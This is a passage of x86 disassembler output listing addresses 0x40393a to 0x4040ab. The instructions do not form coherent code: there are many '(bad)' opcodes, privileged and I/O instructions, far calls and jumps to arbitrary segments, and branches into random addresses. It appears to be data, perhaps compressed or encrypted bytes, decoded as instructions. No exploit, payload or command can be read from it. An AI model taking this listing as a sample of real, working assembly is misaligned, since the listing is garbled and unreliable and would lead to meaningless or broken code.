  40393a:	cmp    DWORD PTR [ebp+ebp*1-0x2a],edi
  40393e:	fild   WORD PTR [esi+0x5eec1565]
  403944:	xchg   ebp,eax
  403945:	into   
  403946:	sahf   
  403947:	cmp    al,0x31
  403949:	xor    BYTE PTR [ecx],bh
  40394b:	mov    ds:0xfda3caf6,al
  403950:	mov    esi,0xfa07ba85
  403955:	xchg   esp,eax
  403956:	sbb    BYTE PTR [ecx],0x73
  403959:	or     al,bl
  40395b:	add    al,0xeb
  40395d:	ins    BYTE PTR es:[edi],dx
  40395e:	mov    WORD PTR [ebx+0x40],ds
  403961:	or     bh,BYTE PTR [ecx]
  403963:	idiv   DWORD PTR [eax+ebx*8+0x553064ba]
  40396a:	dec    eax
  40396b:	dec    edx
  40396c:	jns    0x4039ca
  40396e:	dec    esp
  40396f:	jmp    0x4039a1
  403971:	inc    edx
  403972:	xor    BYTE PTR [esi],al
  403974:	pop    ss
  403975:	xor    eax,0x10d0c51d
  40397a:	cs es gs push esp
  40397e:	in     eax,0x75
  403980:	add    al,0x48
  403982:	shl    DWORD PTR [esi],1
  403984:	or     al,BYTE PTR [ecx-0x1a]
  403987:	inc    eax
  403988:	jmp    0x705997aa
  40398d:	inc    ecx
  40398e:	rcr    DWORD PTR [eax-0x18],cl
  403991:	mov    es,esp
  403993:	dec    eax
  403994:	imul   BYTE PTR [ebx+0x4d]
  403997:	fs xchg edi,eax
  403999:	mov    bh,0x13
  40399b:	out    0xf9,al
  40399d:	cli    
  40399e:	arpl   ax,cx
  4039a0:	rcl    DWORD PTR [ebx+ebx*1],0xce
  4039a4:	jp     0x40395a
  4039a6:	add    bl,bh
  4039a8:	adc    esi,DWORD PTR [eax]
  4039aa:	mov    ecx,0xac3808e6
  4039af:	ds call 0x96c9:0xe324b2a5
  4039b7:	adc    BYTE PTR [edx+0x1f7cb66b],dl
  4039bd:	cwde   
  4039be:	loop   0x403a3f
  4039c0:	ds sbb ecx,ebp
  4039c3:	adc    DWORD PTR [edx-0x1a],ecx
  4039c6:	push   ebp
  4039c7:	push   es
  4039c8:	jno    0x4039d5
  4039ca:	jmp    FWORD PTR [edi-0x6fc72507]
  4039d0:	pop    esi
  4039d1:	pop    ds
  4039d2:	xor    BYTE PTR [esi+0xd],0x6b
  4039d6:	scas   eax,DWORD PTR es:[edi]
  4039d7:	test   DWORD PTR [edx],esp
  4039d9:	shl    DWORD PTR [edi+0x16cf9145],0xa2
  4039e0:	add    eax,0x34a03b7f
  4039e5:	ror    DWORD PTR [edi+ebp*4],1
  4039e8:	pop    esi
  4039e9:	sysret 
  4039eb:	adc    al,BYTE PTR [esi-0x6c]
  4039ee:	in     al,dx
  4039ef:	outs   dx,DWORD PTR ds:[esi]
  4039f0:	inc    edi
  4039f1:	daa    
  4039f2:	jne    0x403988
  4039f4:	das    
  4039f5:	jle    0x403a08
  4039f7:	repnz push eax
  4039f9:	arpl   WORD PTR [esi],di
  4039fb:	nop
  4039fc:	mov    ds:0xc50f5f79,eax
  403a01:	inc    ebx
  403a02:	aas    
  403a03:	inc    BYTE PTR [edi-0x2e]
  403a06:	mov    cs,WORD PTR [ecx-0x29cd27ef]
  403a0c:	lock clc 
  403a0e:	adc    DWORD PTR [esi],0x30
  403a11:	or     al,0xaf
  403a13:	loop   0x403a91
  403a15:	mov    dh,0x28
  403a17:	dec    esp
  403a18:	dec    esp
  403a19:	mov    ch,0x5
  403a1b:	push   ecx
  403a1c:	mov    esi,0x5bb84097
  403a21:	ret    0xa8ba
  403a24:	loop   0x403a7e
  403a26:	push   cs
  403a27:	pushf  
  403a28:	icebp  
  403a29:	adc    al,0xe3
  403a2b:	enter  0x2cb7,0x75
  403a2f:	stos   DWORD PTR es:[edi],eax
  403a30:	ja     0x403a57
  403a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a33:	or     DWORD PTR [edi-0x6a],edi
  403a36:	pop    ebp
  403a37:	shl    DWORD PTR [edx-0x35918801],1
  403a3d:	hlt    
  403a3e:	xor    ah,BYTE PTR [ebx-0x559a1569]
  403a44:	dec    ebp
  403a45:	pop    edi
  403a46:	ror    ecx,cl
  403a48:	test   edx,0xb0382f42
  403a4e:	test   DWORD PTR [ebx-0x2caa8e9],esp
  403a54:	test   DWORD PTR [ecx-0x70],ebx
  403a57:	inc    ecx
  403a58:	into   
  403a59:	jmp    0xfba7:0x620cd23e
  403a60:	inc    ecx
  403a61:	inc    eax
  403a62:	aaa    
  403a63:	sbb    eax,0x1678f422
  403a68:	je     0x403a1c
  403a6a:	mov    bh,0x7c
  403a6c:	xchg   edi,eax
  403a6d:	rcr    DWORD PTR [ecx+edi*4],cl
  403a70:	jae    0x403a75
  403a72:	mov    ebx,0x6617a714
  403a77:	(bad)  [edx+0x46]
  403a7a:	cld    
  403a7b:	mov    ds:0xc9f84a91,eax
  403a80:	mov    BYTE PTR [esi],dl
  403a82:	js     0x403aa1
  403a84:	mov    esp,0xd1b736c
  403a89:	jmp    0xfd9b:0x456e75b3
  403a90:	add    al,0x14
  403a92:	leave  
  403a93:	fwait
  403a94:	jne    0x403a28
  403a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a97:	adc    al,0xbc
  403a99:	inc    ecx
  403a9a:	test   ah,dl
  403a9c:	imul   eax,DWORD PTR [esi+0x6c],0x15f20998
  403aa3:	cdq    
  403aa4:	retf   
  403aa5:	jle    0x403ad1
  403aa7:	and    ecx,DWORD PTR [ebx+0x46]
  403aaa:	jno    0x403a5b
  403aac:	ja     0x403a5a
  403aae:	push   eax
  403aaf:	repz fld QWORD PTR [edx]
  403ab2:	cmp    ah,BYTE PTR [edx]
  403ab4:	adc    esi,DWORD PTR [eax+0x1cd2cb3f]
  403aba:	jb     0x403b32
  403abc:	mov    al,ds:0xd934b6cd
  403ac1:	in     eax,dx
  403ac2:	pop    ecx
  403ac3:	inc    eax
  403ac4:	sahf   
  403ac5:	pop    ebp
  403ac6:	fild   QWORD PTR [ecx-0x64]
  403ac9:	stc    
  403aca:	xor    BYTE PTR [ebx-0x72],ch
  403acd:	stos   BYTE PTR es:[edi],al
  403ace:	push   ecx
  403acf:	xchg   ebp,eax
  403ad0:	dec    eax
  403ad1:	stos   BYTE PTR es:[edi],al
  403ad2:	(bad)  
  403ad3:	dec    esi
  403ad4:	add    edi,DWORD PTR [eax]
  403ad6:	mov    ?,WORD PTR [edi]
  403ad8:	call   0xa62a:0xbe454023
  403adf:	sbb    esp,DWORD PTR [eax]
  403ae1:	inc    esi
  403ae2:	and    dl,BYTE PTR [edx+0xba10881]
  403ae8:	inc    ebp
  403ae9:	sub    eax,0x8f6e74ca
  403aee:	sti    
  403aef:	push   edx
  403af0:	jge    0x403ac4
  403af2:	loopne 0x403adf
  403af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af5:	or     eax,0xfcb87219
  403afa:	jo     0x403b45
  403afc:	xlat   BYTE PTR ds:[ebx]
  403afd:	clc    
  403afe:	pop    es
  403aff:	pop    edi
  403b00:	sbb    DWORD PTR [ebp+0x2eb583ee],esp
  403b06:	daa    
  403b07:	mov    ebx,0xf0efb1a
  403b0c:	xor    dl,BYTE PTR [edx-0x63ba7aa9]
  403b12:	mov    cl,0x94
  403b14:	or     eax,DWORD PTR [edi+0x3e]
  403b17:	mov    cl,0x90
  403b19:	nop
  403b1a:	mov    eax,0xffd1575e
  403b1f:	mov    ds:0xca0cee50,eax
  403b24:	cmp    esp,DWORD PTR [ebp-0x28]
  403b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b28:	mov    ah,0xe
  403b2a:	test   BYTE PTR [ecx-0xf],0xbe
  403b2e:	(bad)  
  403b2f:	test   BYTE PTR [ebp+0x5e],0xc8
  403b33:	cwde   
  403b34:	loopne 0x403afb
  403b36:	fdiv   DWORD PTR [eax]
  403b38:	adc    BYTE PTR [ebp+edx*1+0x623db5bb],bl
  403b3f:	push   ss
  403b40:	cmp    ah,BYTE PTR [ecx+0x2]
  403b43:	cmp    ebp,DWORD PTR [ecx+edx*4-0x317a51b4]
  403b4a:	jmp    0x86819bd6
  403b4f:	mov    ds:0x4869353b,al
  403b54:	pop    edi
  403b55:	std    
  403b56:	imul   ecx,DWORD PTR [ecx+eiz*4-0x59],0x19c4de38
  403b5e:	fisubr DWORD PTR [ebp-0x522fdd9f]
  403b64:	ins    DWORD PTR es:[edi],dx
  403b65:	enter  0xaefa,0x94
  403b69:	stc    
  403b6a:	mov    eax,DWORD PTR [edx+0x51]
  403b6d:	push   es
  403b6e:	repz aam 0x2e
  403b71:	repz loopne 0x403afd
  403b74:	jecxz  0x403b98
  403b76:	cli    
  403b77:	adc    eax,0x4cc9d390
  403b7c:	test   al,0xb8
  403b7e:	jnp    0x403b4b
  403b80:	or     al,0xb2
  403b82:	inc    edi
  403b83:	loopne 0x403bb8
  403b85:	js     0x403b5a
  403b87:	je     0x403bce
  403b89:	rcr    BYTE PTR [eax],0xce
  403b8c:	dec    ebp
  403b8d:	dec    esi
  403b8e:	pop    edx
  403b8f:	inc    eax
  403b90:	xchg   ecx,eax
  403b91:	cmp    BYTE PTR [edi-0x219ef588],bh
  403b97:	outs   dx,BYTE PTR ds:[esi]
  403b98:	fcom   DWORD PTR [edi-0x80d3393]
  403b9e:	test   DWORD PTR [edi+0x6c],ebp
  403ba1:	jbe    0x403b4f
  403ba3:	cmp    al,0xb9
  403ba5:	or     bl,bh
  403ba7:	jp     0x403b31
  403ba9:	mov    eax,0x65008221
  403bae:	call   0x960af027
  403bb3:	mov    ecx,0x3c469685
  403bb8:	pop    esp
  403bb9:	ds sbb esi,esi
  403bbc:	repz aad 0x33
  403bbf:	add    al,0x8
  403bc1:	mov    ecx,0x6043e6ae
  403bc6:	sub    ch,BYTE PTR [esi+esi*4+0x96ec268]
  403bcd:	pop    ebx
  403bce:	mov    al,0xd4
  403bd0:	lods   al,BYTE PTR ds:[esi]
  403bd1:	pop    esp
  403bd2:	adc    DWORD PTR [ecx+edi*4],edx
  403bd5:	popf   
  403bd6:	fst    DWORD PTR [edi-0x3d]
  403bd9:	adc    edx,DWORD PTR [edi+0x41]
  403bdc:	and    eax,eax
  403bde:	xchg   edi,eax
  403bdf:	sbb    esi,edi
  403be1:	in     eax,0xa2
  403be3:	jae    0x403b9b
  403be5:	and    BYTE PTR [edi+eax*1],ah
  403be8:	fsub   QWORD PTR [ebp+0x13]
  403beb:	js     0x403b94
  403bed:	(bad)  
  403bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bef:	jg     0x403c3a
  403bf1:	inc    edi
  403bf2:	xor    BYTE PTR [edx-0x2e],cl
  403bf5:	add    al,0x3b
  403bf7:	retf   0xb9ba
  403bfa:	int    0x2d
  403bfc:	sbb    cl,BYTE PTR [edx-0x52]
  403bff:	jo     0x403bd9
  403c01:	push   edx
  403c02:	mov    cl,0x7
  403c04:	push   esp
  403c05:	bound  esp,QWORD PTR [edi-0x6f]
  403c08:	popf   
  403c09:	add    eax,0xdd6393a2
  403c0e:	iret   
  403c0f:	lds    edi,FWORD PTR [ebx+0x4f]
  403c12:	pop    edi
  403c13:	cmp    al,BYTE PTR [ecx+0x4622f8c4]
  403c19:	popa   
  403c1a:	dec    esi
  403c1b:	add    DWORD PTR [ecx-0x50ad6422],ebp
  403c21:	daa    
  403c22:	imul   ecx,DWORD PTR [ebx+0x2995741f],0xffffffdb
  403c29:	pushf  
  403c2a:	mov    ch,0xff
  403c2c:	pop    esp
  403c2d:	pop    ss
  403c2e:	aaa    
  403c2f:	push   edx
  403c30:	sbb    eax,0x8f91ada7
  403c35:	cld    
  403c36:	(bad)  
  403c38:	pop    edi
  403c39:	test   BYTE PTR [eax-0x3a065256],cl
  403c3f:	(bad)  
  403c40:	(bad)  
  403c41:	jmp    0xf24:0xb56594f
  403c48:	(bad)  
  403c49:	shl    BYTE PTR [ecx],cl
  403c4b:	mov    fs,WORD PTR [ebp+ebp*4+0x669a9004]
  403c52:	mov    al,0xe
  403c54:	retf   
  403c55:	jbe    0x403cd6
  403c57:	aaa    
  403c58:	push   eax
  403c59:	adc    DWORD PTR [eax-0x4b],edx
  403c5c:	retf   
  403c5d:	inc    edx
  403c5e:	pop    ds
  403c5f:	stc    
  403c60:	retf   0x3d44
  403c63:	scas   eax,DWORD PTR es:[edi]
  403c64:	mov    dh,0x53
  403c66:	inc    edi
  403c67:	mov    ebp,0x6203594d
  403c6c:	inc    edx
  403c6d:	in     eax,0x6e
  403c6f:	pushf  
  403c70:	mov    al,ds:0xc533c8fa
  403c75:	jecxz  0x403c31
  403c77:	jge    0x403cc3
  403c79:	inc    eax
  403c7a:	stos   BYTE PTR es:[edi],al
  403c7b:	xchg   DWORD PTR [ecx-0x3cde75e8],ebp
  403c81:	mov    esi,0x7818ccd2
  403c86:	mov    eax,ds:0x74caca1c
  403c8b:	int    0x1e
  403c8d:	inc    edx
  403c8e:	gs and al,0xaa
  403c91:	mov    WORD PTR [esi+edi*4-0x47],ss
  403c95:	ja     0x403c88
  403c97:	ss jbe 0x403c21
  403c9a:	es imul eax,esp,0x30
  403c9e:	xchg   BYTE PTR [esi+0x5d36d0d2],cl
  403ca4:	dec    eax
  403ca5:	out    dx,eax
  403ca6:	mov    ebx,0x9c333a0d
  403cab:	or     al,0xf
  403cad:	xchg   edi,eax
  403cae:	xor    ebp,DWORD PTR [ebp-0x5b]
  403cb1:	inc    esp
  403cb2:	ja     0x403ce1
  403cb4:	mov    ebx,0x67cd21c0
  403cb9:	push   eax
  403cba:	outs   dx,DWORD PTR ds:[esi]
  403cbb:	(bad)  
  403cbc:	mov    bl,0x94
  403cbe:	outs   dx,DWORD PTR ds:[esi]
  403cbf:	jne    0x403c80
  403cc1:	mov    dl,0xda
  403cc3:	inc    ebx
  403cc4:	jge    0x403c94
  403cc6:	rcl    DWORD PTR [ebx+edi*2-0x6c724d9],0x5a
  403cce:	dec    ebp
  403ccf:	(bad)  
  403cd1:	cmp    ah,BYTE PTR [ecx+eax*8+0x3f384cce]
  403cd8:	pop    edx
  403cd9:	fisubr WORD PTR [ebx-0x6f88fbc2]
  403cdf:	push   ecx
  403ce0:	add    bh,BYTE PTR [edx-0x3]
  403ce3:	push   edx
  403ce4:	jmp    DWORD PTR [ecx]
  403ce6:	in     eax,0xaa
  403ce8:	push   ebx
  403ce9:	mov    al,ds:0xbd143af
  403cee:	mov    ds:0x219c69d5,eax
  403cf3:	loopne 0x403c9c
  403cf5:	cmp    dl,bh
  403cf7:	shl    BYTE PTR [edi],cl
  403cf9:	sub    esp,DWORD PTR [eax-0x3095b784]
  403cff:	dec    edx
  403d00:	xlat   BYTE PTR ds:[ebx]
  403d01:	pop    ecx
  403d02:	push   esi
  403d03:	fxch   st(6)
  403d05:	cmp    ecx,DWORD PTR [ebx]
  403d07:	push   ds
  403d08:	sub    al,0x23
  403d0a:	mov    dh,0xde
  403d0c:	cdq    
  403d0d:	icebp  
  403d0e:	add    al,0x4
  403d10:	dec    eax
  403d11:	popf   
  403d12:	xor    BYTE PTR [ecx],al
  403d14:	sbb    esp,DWORD PTR [esi]
  403d16:	ins    BYTE PTR es:[edi],dx
  403d17:	adc    BYTE PTR [edx+0x73],0x53
  403d1b:	jg     0x403cc8
  403d1d:	inc    esp
  403d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d1f:	xor    bh,BYTE PTR [eax]
  403d21:	rep stos DWORD PTR es:[edi],eax
  403d23:	mov    eax,0xe2b9c265
  403d28:	jle    0x403d53
  403d2a:	xchg   esp,eax
  403d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d2c:	fiadd  DWORD PTR [esi+0x4c7b712b]
  403d32:	aas    
  403d33:	xchg   BYTE PTR [edi+edx*8-0x55],ah
  403d37:	dec    esi
  403d38:	and    al,0xa1
  403d3a:	push   ebx
  403d3b:	cwde   
  403d3c:	inc    esp
  403d3d:	sbb    ebp,DWORD PTR [esi-0x6e]
  403d40:	call   0x64aba1b6
  403d45:	mov    dl,0x5c
  403d47:	cmc    
  403d48:	popa   
  403d49:	mov    esp,0x19bc7922
  403d4e:	mov    dl,0x12
  403d50:	xchg   edx,eax
  403d51:	rcr    DWORD PTR [esi],cl
  403d53:	pop    esp
  403d54:	xchg   edx,eax
  403d55:	arpl   WORD PTR [ebp-0x53],di
  403d58:	inc    eax
  403d59:	mov    eax,0x91642d6c
  403d5e:	sub    eax,0x5f0e8468
  403d63:	gs cli 
  403d65:	xchg   esp,eax
  403d66:	pop    es
  403d67:	cmp    BYTE PTR [eax-0x7c],cl
  403d6a:	mov    al,0x3e
  403d6c:	cmp    edx,DWORD PTR [edi-0x3b]
  403d6f:	push   0x1e
  403d71:	jns    0x403d38
  403d73:	adc    BYTE PTR [ecx],ah
  403d75:	rcr    edx,cl
  403d77:	addr16 dec ecx
  403d79:	pop    ecx
  403d7a:	rol    BYTE PTR [ebp+0x1b],cl
  403d7d:	adc    edx,ebp
  403d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d80:	push   esp
  403d81:	and    al,0xbc
  403d83:	add    DWORD PTR [ecx-0x70],esp
  403d86:	push   ds
  403d87:	in     al,0x61
  403d89:	clc    
  403d8a:	push   ebx
  403d8b:	push   ecx
  403d8c:	loope  0x403dd4
  403d8e:	loopne 0x403ddd
  403d90:	cmp    eax,0x4610f500
  403d95:	pop    ecx
  403d96:	jmp    0x403d64
  403d98:	int    0x1e
  403d9a:	pop    ebp
  403d9b:	add    BYTE PTR [edi-0x11d22343],0xa5
  403da2:	clc    
  403da3:	das    
  403da4:	in     eax,0xb8
  403da6:	test   DWORD PTR [eax],ebx
  403da8:	pop    esp
  403da9:	out    0x7a,eax
  403dab:	fdivr  st,st(1)
  403dad:	and    al,0x82
  403daf:	dec    esi
  403db0:	push   ecx
  403db1:	sub    ebp,DWORD PTR [ebp*4+0x32a0283c]
  403db8:	cmp    ecx,DWORD PTR [edi-0x2d]
  403dbb:	dec    ebp
  403dbc:	iret   
  403dbd:	mov    ?,edi
  403dbf:	sti    
  403dc0:	push   edx
  403dc1:	mov    eax,0xbb923dfc
  403dc6:	mov    BYTE PTR [edi+edi*1+0x3ddef3b5],bl
  403dcd:	(bad)  
  403dce:	cmp    al,0x24
  403dd0:	inc    esp
  403dd1:	adc    BYTE PTR [bp-0x5f],bl
  403dd5:	push   0xdb3d99fc
  403dda:	jl     0x403e03
  403ddc:	push   ds
  403ddd:	test   DWORD PTR gs:[bp+0x4a],ebx
  403de2:	mov    edx,0x5cbd23d6
  403de7:	sub    edx,DWORD PTR [esi-0x63]
  403dea:	sar    DWORD PTR [eax+0x4009b99a],1
  403df0:	mov    dl,0x14
  403df2:	jp     0x403d82
  403df4:	pop    ss
  403df5:	jae    0x403e18
  403df7:	fcomp  QWORD PTR [ebp-0x10]
  403dfa:	mov    edx,0x6b8f306c
  403dff:	or     al,0xe8
  403e01:	add    eax,DWORD PTR [edi+0x3d]
  403e04:	into   
  403e05:	or     eax,ebx
  403e07:	jb     0x403d93
  403e09:	imul   ebx,DWORD PTR [ecx+ecx*4+0x2e884f90],0xffffffae
  403e11:	sub    DWORD PTR [edi-0x5b],esi
  403e14:	es mov ebp,0xd9533ad8
  403e1a:	sub    bl,0x7a
  403e1d:	test   BYTE PTR [ebp*2+0x42b6a136],cl
  403e24:	pop    edx
  403e25:	rcl    DWORD PTR [ebx+0x1459565b],1
  403e2b:	data16 in al,dx
  403e2d:	sbb    al,BYTE PTR [eax]
  403e2f:	daa    
  403e30:	jmp    0x403eb1
  403e32:	imul   edx,DWORD PTR [ebp+0x50],0x52
  403e36:	cmp    DWORD PTR [edi-0x29],0x28
  403e3a:	enter  0xaa97,0xca
  403e3e:	ins    DWORD PTR es:[edi],dx
  403e3f:	add    esp,DWORD PTR [edx+0x69]
  403e42:	lock fucomp st(4)
  403e45:	ret    0xcba6
  403e48:	ins    BYTE PTR es:[edi],dx
  403e49:	and    al,0xa8
  403e4b:	push   edi
  403e4c:	adc    bl,BYTE PTR [esi]
  403e4e:	xor    ebx,0x9805e431
  403e54:	nop
  403e55:	inc    ebp
  403e56:	and    ecx,ebp
  403e58:	lods   al,BYTE PTR ds:[esi]
  403e59:	mov    ecx,0xbce70b06
  403e5e:	add    DWORD PTR [ebx-0x1c],eax
  403e61:	bound  ecx,QWORD PTR [edi+0x7d1402f2]
  403e67:	adc    al,0xed
  403e69:	mov    al,ss:0x2720898
  403e6f:	adc    al,0x11
  403e71:	lahf   
  403e72:	test   DWORD PTR [eax-0x644b1b5f],edi
  403e78:	mov    cl,BYTE PTR [ebp-0x268fab25]
  403e7e:	inc    edi
  403e7f:	out    dx,eax
  403e80:	cmp    BYTE PTR [edi],al
  403e82:	push   edx
  403e83:	cmc    
  403e84:	fsub   QWORD PTR [eax]
  403e86:	out    0xe5,al
  403e88:	jmp    0x403efe
  403e8a:	pop    ss
  403e8b:	and    cl,bh
  403e8d:	sti    
  403e8e:	inc    esp
  403e8f:	icebp  
  403e90:	push   cs
  403e91:	cmp    eax,0xa20f7975
  403e96:	dec    esp
  403e97:	mov    ecx,0x8427b05f
  403e9c:	mov    ch,0x93
  403e9e:	mov    eax,0xcef87be0
  403ea3:	push   0xf348dee4
  403ea8:	dec    ebp
  403ea9:	call   0xfd221e0d
  403eae:	fistp  WORD PTR [ecx]
  403eb0:	int    0x21
  403eb2:	pop    eax
  403eb3:	pop    edi
  403eb4:	inc    edx
  403eb5:	push   ss
  403eb6:	xchg   ecx,eax
  403eb7:	leave  
  403eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eb9:	mov    edi,0xaa523089
  403ebe:	pop    esi
  403ebf:	shl    BYTE PTR [edx-0xc9e527b],1
  403ec5:	(bad)  
  403ec6:	in     al,dx
  403ec7:	fstp   QWORD PTR [edx-0x24]
  403eca:	xchg   ebp,eax
  403ecb:	jle    0x403f3b
  403ecd:	mov    dh,0x5c
  403ecf:	mov    esi,0x72b354f8
  403ed4:	ins    DWORD PTR es:[edi],dx
  403ed5:	aam    0x4d
  403ed7:	jge    0x403f19
  403ed9:	inc    ecx
  403eda:	lea    esp,[esi-0x30]
  403edd:	pop    ebx
  403ede:	pop    ebp
  403edf:	dec    ecx
  403ee0:	or     BYTE PTR [ecx],al
  403ee2:	js     0x403ed7
  403ee4:	dec    ebp
  403ee5:	push   ds
  403ee6:	sbb    eax,0x45fc2826
  403eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eec:	xchg   esp,eax
  403eed:	shl    DWORD PTR [ebx+0x7dadf552],0xc6
  403ef4:	mov    dh,0x34
  403ef6:	cmp    ecx,ebp
  403ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ef9:	adc    eax,0xcfcdae9
  403efe:	in     al,dx
  403eff:	xchg   ebx,eax
  403f00:	das    
  403f01:	sbb    cl,BYTE PTR [ebp-0x11]
  403f04:	popf   
  403f05:	je     0x403eda
  403f07:	pop    ebx
  403f08:	mov    BYTE PTR [ecx+0x87413df],0x2c
  403f0f:	stos   DWORD PTR es:[edi],eax
  403f10:	pop    ebp
  403f11:	xchg   ecx,eax
  403f12:	pop    ebx
  403f13:	aas    
  403f14:	scas   al,BYTE PTR es:[edi]
  403f15:	jbe    0x403e9c
  403f17:	mov    ds:0xcfa8161c,eax
  403f1c:	or     edi,DWORD PTR [ebp-0x4ced2855]
  403f22:	mov    ds:0xf70efc78,al
  403f27:	jmp    0x59ebb185
  403f2c:	in     eax,dx
  403f2d:	mov    eax,ds:0xfdf8bb8b
  403f32:	jo     0x403f64
  403f34:	xor    BYTE PTR [ebp-0x42],0x2c
  403f38:	bound  ebp,QWORD PTR [ebp-0x52173b3b]
  403f3e:	loope  0x403f5d
  403f40:	mov    cl,dl
  403f42:	xor    al,0xb3
  403f44:	pop    ds
  403f45:	pop    es
  403f46:	loope  0x403f82
  403f48:	dec    esp
  403f49:	sbb    al,0x11
  403f4b:	mov    bh,0x50
  403f4d:	dec    ebx
  403f4e:	les    ecx,FWORD PTR [esi-0x7b]
  403f51:	int3   
  403f52:	gs add eax,0x1710c268
  403f58:	scas   al,BYTE PTR es:[edi]
  403f59:	(bad)  
  403f5b:	jg     0x403f3a
  403f5d:	jp     0x403f11
  403f5f:	nop
  403f60:	mov    DWORD PTR [edx-0x7b6d9399],esi
  403f66:	aad    0x30
  403f68:	pop    esp
  403f69:	inc    edi
  403f6a:	xchg   ebx,eax
  403f6b:	xchg   edi,eax
  403f6c:	das    
  403f6d:	cmp    ebx,esp
  403f6f:	hlt    
  403f70:	mov    bh,0x0
  403f72:	(bad)  
  403f73:	mov    ecx,0xcf1af2da
  403f78:	push   edx
  403f79:	pop    eax
  403f7a:	loop   0x403fc0
  403f7c:	das    
  403f7d:	data16 outs dx,WORD PTR ds:[esi]
  403f80:	jns    0x403fc3
  403f82:	bound  edx,QWORD PTR ds:0x48bd6d1b
  403f88:	sbb    bl,BYTE PTR [edx-0x45]
  403f8b:	leave  
  403f8c:	mov    ecx,0x19f855e8
  403f91:	aaa    
  403f92:	rol    BYTE PTR [edi],1
  403f94:	or     al,0xf
  403f96:	mov    edi,0xbc106f42
  403f9b:	mov    DWORD PTR [edx+ecx*2],edi
  403f9e:	in     eax,0xd9
  403fa0:	ins    BYTE PTR es:[edi],dx
  403fa1:	lds    ebx,FWORD PTR [ebp+0x7c1c445]
  403fa7:	data16 repz int 0xeb
  403fab:	cmp    DWORD PTR [edi],ecx
  403fad:	xchg   BYTE PTR [esi],al
  403faf:	popf   
  403fb0:	lods   al,BYTE PTR ds:[esi]
  403fb1:	pop    ebp
  403fb2:	or     DWORD PTR [esi-0x19],0xffffffce
  403fb6:	xor    BYTE PTR [esi],ah
  403fb8:	ror    DWORD PTR [edx+0x73],1
  403fbb:	or     eax,0xf245317a
  403fc0:	xor    al,BYTE PTR ds:0xdcb9b058
  403fc6:	cld    
  403fc7:	mov    bh,0x14
  403fc9:	push   ss
  403fca:	xchg   ecx,eax
  403fcb:	mov    DWORD PTR [eax+esi*2-0x47],esp
  403fcf:	mov    DWORD PTR [edx+0x5b],edi
  403fd2:	ror    BYTE PTR [esi-0x268ac88a],cl
  403fd8:	arpl   WORD PTR [esi+0x35bd6160],si
  403fde:	push   edx
  403fdf:	push   eax
  403fe0:	sbb    BYTE PTR [ebx],dl
  403fe2:	fist   WORD PTR [eax+0x2c6cc5fa]
  403fe8:	js     0x403f88
  403fea:	dec    ebx
  403feb:	dec    ebp
  403fec:	pop    ds
  403fed:	sub    al,0xd9
  403fef:	mov    dl,0xc2
  403ff1:	cmp    dh,dh
  403ff3:	and    eax,0x4c557ba9
  403ff8:	sbb    al,0x2b
  403ffa:	inc    edx
  403ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ffc:	aas    
  403ffd:	daa    
  403ffe:	and    ebx,eax
  404000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404001:	and    cl,dl
  404003:	pop    edx
  404004:	add    ebp,DWORD PTR [ebp-0xe]
  404007:	and    cl,BYTE PTR [esi]
  404009:	xor    ebp,ecx
  40400b:	inc    ecx
  40400c:	mov    esi,0x9d523e2e
  404011:	pop    ebx
  404012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404013:	inc    esp
  404014:	jo     0x403fa1
  404016:	mov    ebx,0x7f6e9655
  40401b:	push   esi
  40401c:	push   edx
  40401d:	jp     0x404097
  40401f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404020:	std    
  404021:	lock cmp al,BYTE PTR ds:0xcfbd6254
  404028:	frstor [edi]
  40402a:	push   ebp
  40402b:	arpl   dx,si
  40402d:	add    DWORD PTR [ebp+eiz*2+0x53a594a3],ecx
  404034:	xchg   edx,eax
  404035:	nop
  404036:	push   ebp
  404037:	js     0x404038
  404039:	call   0x7742:0xec5e5199
  404040:	xchg   ebp,eax
  404041:	lock std 
  404043:	in     eax,0x66
  404045:	xor    eax,0x8bb401c7
  40404a:	mov    edx,0xedc6f0b4
  40404f:	shl    al,1
  404051:	fcomp  QWORD PTR [ecx+0x50]
  404054:	lds    edi,FWORD PTR [ecx]
  404056:	add    dh,dh
  404058:	fist   DWORD PTR [eax+0x66]
  40405b:	mov    ebp,DWORD PTR [edi+0x78]
  40405e:	rcl    edx,cl
  404060:	pop    eax
  404061:	cli    
  404062:	or     ecx,DWORD PTR [esi]
  404064:	xchg   esi,eax
  404065:	mov    esp,0x5e194c0
  40406a:	out    dx,al
  40406b:	xchg   BYTE PTR [ebp+0x14],dh
  40406e:	std    
  40406f:	or     BYTE PTR [ebx],ch
  404071:	dec    esi
  404072:	aas    
  404073:	(bad)  
  404074:	dec    ebx
  404075:	pushf  
  404076:	iret   
  404077:	pop    ss
  404078:	mov    esp,0xeb3c87fd
  40407d:	addr16 inc edx
  40407f:	loopne 0x404092
  404081:	dec    ecx
  404082:	test   DWORD PTR [edx-0x78],esi
  404085:	push   esp
  404086:	(bad)  
  404087:	fcom   DWORD PTR [ebx-0x40]
  40408a:	icebp  
  40408b:	lods   al,BYTE PTR ds:[esi]
  40408c:	leave  
  40408d:	dec    ecx
  40408e:	xchg   ebx,eax
  40408f:	pop    edx
  404090:	ins    DWORD PTR es:[edi],dx
  404091:	mov    ebx,0xe42c2b7d
  404096:	popa   
  404097:	sahf   
  404098:	dec    ecx
  404099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40409a:	and    eax,0x9c241b7f
  40409f:	mov    edi,0x9e5e6415
  4040a4:	xchg   esp,eax
  4040a5:	jl     0x404079
  4040a7:	add    BYTE PTR [ebx+eiz*2],0x7b
  4040ab:	call   0xfebc:0x21a1cf2
